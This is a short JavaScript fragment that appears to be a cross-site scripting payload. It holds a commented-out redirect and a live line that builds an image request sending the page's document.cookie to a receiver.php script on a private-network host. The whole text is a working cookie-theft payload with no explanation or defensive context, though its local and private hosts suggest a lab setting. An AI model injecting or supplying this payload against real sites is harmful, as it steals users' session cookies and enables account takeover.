// window.location="http://localhost:12345/XSS/receiver.php?cookies="+document.cookie;
new Image().src="http://10.131.255.6:12345/XSS/receiver.php?cookies="+escape(document.cookie);
